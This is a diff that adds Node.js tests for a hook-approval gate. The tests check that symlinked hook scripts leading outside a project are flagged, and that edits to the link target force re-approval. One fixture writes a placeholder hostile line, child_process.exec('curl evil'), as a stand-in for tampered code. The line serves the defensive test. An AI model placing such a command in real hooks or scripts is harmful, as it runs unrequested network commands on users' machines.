@@ -101,6 +101,76 @@ test("$CLAUDE_PROJECT_DIR paths resolve to the file that would actually run", ()
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
+// The nastiest shape of #39: the hook names an innocent path *inside* the project,
+// but that path is a symlink whose target lives somewhere else entirely. Approving
+// the name would approve whatever the target holds now — and whatever it holds
+// tomorrow. So the fingerprint must follow the link: say the code is OUTSIDE on the
+// card, and hash the target's real bytes.
+function symlinkOrSkip(t, target, link) {
+  try { fs.symlinkSync(target, link, "file"); return true; }
+  catch (e) {
+    // Windows needs Developer Mode or admin for symlinks; a CI box without either
+    // must not report a green it never earned.
+    t.skip(`cannot create symlinks here (${e.code}) — symlink case not exercised`);
+    return false;
+  }
+}
+
+test("a hooked script that is a symlink out of the project is flagged, and follows its target", (t) => {
+  const dir = tmpProject();
+  const outside = tmpProject();                       // a directory the owner never registered
+  const target = path.join(outside, "payload.js");
+  fs.writeFileSync(target, "console.log('harmless')\n");
+  writeSettings(dir, HOOKED);
+  if (!symlinkOrSkip(t, target, path.join(dir, "marker-hook.js"))) {
+    fs.rmSync(dir, { recursive: true, force: true });
+    fs.rmSync(outside, { recursive: true, force: true });
+    return;                                           // t.skip() does not stop the body
+  }
+
+  const before = fingerprint(dir);
+  // The card names the path the project shows, and marks that it leaves the project.
+  assert.deepStrictEqual(before.scripts.map((s) => s.rel), ["marker-hook.js"]);
+  assert.strictEqual(before.scripts[0].outside, true,
+    "a link that resolves out of the project must be reported as outside");
+
+  // Editing only the target — the project itself is byte-for-byte unchanged — must
+  // still invalidate the approval, because it is the target that runs.
+  fs.writeFileSync(target, "require('child_process').exec('curl evil')\n");
+  assert.notStrictEqual(fingerprint(dir).hash, before.hash,
+    "editing the symlink target must re-ask");
+
+  // Re-pointing the link at different code re-asks too, with settings untouched.
+  const other = path.join(outside, "other.js");
+  fs.writeFileSync(other, "console.log('different again')\n");
+  const mid = fingerprint(dir).hash;
+  fs.unlinkSync(path.join(dir, "marker-hook.js"));
+  if (symlinkOrSkip(t, other, path.join(dir, "marker-hook.js"))) {
+    assert.notStrictEqual(fingerprint(dir).hash, mid,
+      "re-pointing the symlink must re-ask");
+  }
+
+  fs.rmSync(dir, { recursive: true, force: true });
+  fs.rmSync(outside, { recursive: true, force: true });
+});
+
+test("a symlink that stays inside the project is not cried wolf over", (t) => {
+  const dir = tmpProject();
+  fs.mkdirSync(path.join(dir, "scripts"), { recursive: true });
+  const target = path.join(dir, "scripts", "start.js");
+  fs.writeFileSync(target, "console.log('ok')\n");
+  writeSettings(dir, HOOKED);
+  if (!symlinkOrSkip(t, target, path.join(dir, "marker-hook.js"))) {
+    fs.rmSync(dir, { recursive: true, force: true });
+    return;
+  }
+  const fp = fingerprint(dir);
+  assert.strictEqual(fp.scripts[0].outside, false,
+    "a link resolving within the project is inside — flagging it would train click-through");
+  assert.ok(fp.hash);
+  fs.rmSync(dir, { recursive: true, force: true });
+});
+
 test("unreadable/absent settings never throw — the gate must not brick a project", () => {
   const dir = tmpProject();
   fs.mkdirSync(path.join(dir, ".claude"), { recursive: true });
